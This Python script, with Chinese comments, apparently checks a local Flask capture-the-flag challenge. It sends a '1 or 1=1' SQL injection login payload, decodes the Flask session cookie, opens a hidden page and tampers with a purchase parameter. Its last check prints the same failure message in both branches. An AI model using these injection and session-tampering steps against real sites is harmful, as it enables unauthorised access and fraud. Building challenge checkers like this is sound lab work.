# checker 检测各个功能点是否能满足正常用户的需求

import requests
from flask_session_cookie_manager3 import FSCM

'''
1. 登录功能
2. session解密功能
3. 隐藏界面访问功能
4. 正常购买最后商品功能
'''


url = 'http://127.0.0.1:5000/'
sqlpayload = 'login?Email=1%20or%201=1%20or%201=1'
payload = 'login?Email={email}&psw={passwd}'.format(email="", passwd="")
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE'
}
session = requests.session()
data = session.post(url+sqlpayload,headers=headers)
if str(data.content).find("Letter")+1:
    print("sql注入成功")
else:
    print("sql注入失败")

data = session.post(url+payload, headers=headers)
cookie = session.cookies
sess = cookie.get_dict()
text = FSCM.decode(sess['session']).decode("utf-8")
print(text)

# get final profuct
data3 = session.post(url+"finalpro", headers=headers)
if data3.status_code >= 400 or str(data3.content).find('ERROR')+1:
    print("特权用户访问隐藏页面失败")
else:
    print("特权用户访问隐藏页面成功")


# 这个漏洞好像没有办法进行正常检测，只能进行原操作的检测
data3 = session.post(url+'finalbuy?Time=10000000000000000', headers=headers)
if data3.status_code >= 400 or str(data3.content).find('ERROR')+1:
    print("特权用户更改参数购买失败")
else:
    print("特权用户更改参数购买失败")

